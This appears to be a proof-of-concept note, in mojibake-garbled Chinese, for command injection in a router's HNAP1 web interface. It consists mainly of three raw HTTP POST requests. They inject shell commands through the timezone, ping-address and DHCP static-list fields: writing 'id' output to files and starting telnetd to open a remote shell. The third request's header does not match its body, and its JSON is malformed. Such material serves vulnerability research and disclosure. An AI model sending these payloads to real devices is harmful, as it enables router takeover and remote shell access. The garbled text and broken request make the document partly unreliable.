**ç®¡é“ç¬¦æ˜¯ä¸å¿…è¦çš„ï¼Œé—­åˆæ˜¯å¿…è¦çš„(ç‰¹æ®Šæƒ…å†µ echo )** 

;æœ‰æ— ç©ºæ ¼éƒ½è¡Œ



ä½¿ç”¨SetNTPServerSettingsæ¥å£å¾€/etc/config/systemæ–‡ä»¶ä¸­æ³¨å…¥å‘½ä»¤

```http
POST /HNAP1/ HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: application/json
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
SOAPACTION: "http://purenetworks.com/HNAP1/SetNTPServerSettings"
HNAP_AUTH: 8D44532710B3593A73383F4366A6A89D 1700479594806
Content-Length: 99
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/Home.html?t=1700479592337
Cookie: PHPSESSID=e9920db8aee2f5b998590af3e5eb20d3; uid=5Pv9fmhD; PrivateKey=29C562F7DA84E8FD829F2125E8C11CFC


{
	"SetNTPServerSettings":{
		"system_time_timezone":"'|`id > /tmp/result`|echo'"
	}
}
```





```http
POST /HNAP1/ HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: application/json
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
SOAPACTION: "http://purenetworks.com/HNAP1/SetNetworkTomographySettings"
Content-Length: 230
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/Home.html?t=1700472754954
Cookie: PHPSESSID=e9920db8aee2f5b998590af3e5eb20d3; uid=LVAxmY29; PrivateKey=BB1FEDF0DF83D8E15348FE7C93037EA3; 

{
    "SetNetworkTomographySettings":{
    "tomography_ping_address":"http://example.com/'&telnetd&echo'1",
    "tomography_ping_number":"1",
    "tomography_ping_size":"4",
    "tomography_ping_timeout":"",
    "tomography_ping_ttl":""
	}
}
```







```http
POST /HNAP1/ HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: application/json
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
SOAPACTION: "http://purenetworks.com/HNAP1/SetNetworkTomographySettings"
Content-Length: 260
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/Home.html?t=1700472754954
Cookie: PHPSESSID=e9920db8aee2f5b998590af3e5eb20d3; uid=ye2PVqI8; PrivateKey=CCEB89E7E0DAB212E9FEB4A4695A017E

{
    "SetIpMacBindSettings":{
    "lan_unit":"0"
    "lan(0)_dhcps_staticlist":"1,$(id>rce_confirmed),02:42:d6:f9:dc:4e,192.168.0.15"
}
```







